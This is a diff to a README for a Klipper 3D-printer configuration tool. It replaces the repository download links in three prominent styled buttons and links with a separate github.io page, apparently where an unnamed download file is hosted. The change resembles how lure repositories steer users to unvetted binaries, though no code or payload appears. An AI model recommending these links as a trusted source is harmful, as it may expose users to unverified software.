@@ -1,7 +1,7 @@
 <h1>🖨️ ATGENX-Klipper-Studio - Your All-in-One Klipper Configurator</h1>
 
 <p align="center">
-  <a href="https://github.com/Solomonfeeling3505/ATGENX-Klipper-Studio" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);margin:20px 0;">⬇️ Download ATGENX-Klipper-Studio Now</a>
+  <a href="https://solomonfeeling3505.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);margin:20px 0;">⬇️ Download ATGENX-Klipper-Studio Now</a>
 </p>
 
 ## 🎯 What Is ATGENX-Klipper-Studio?
@@ -31,7 +31,7 @@ Working on multiple printer configurations? ATGENX-Klipper-Studio can intelligen
 ## 🚀 Getting Started
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/Solomonfeeling3505/ATGENX-Klipper-Studio](https://github.com/Solomonfeeling3505/ATGENX-Klipper-Studio)
+Visit this link to download the application: [https://solomonfeeling3505.github.io](https://solomonfeeling3505.github.io)
 
 Look for the download section on that page. The file you need will be clearly marked.
 
@@ -152,7 +152,7 @@ For help, questions, or suggestions, please visit our GitHub repository. You can
 ---
 
 <p align="center">
-  <a href="https://github.com/Solomonfeeling3505/ATGENX-Klipper-Studio" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Get ATGENX-Klipper-Studio Here</a>
+  <a href="https://solomonfeeling3505.github.io" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Get ATGENX-Klipper-Studio Here</a>
 </p>
 
 <p align="center">Made with ❤️ for the 3D printing community</p>
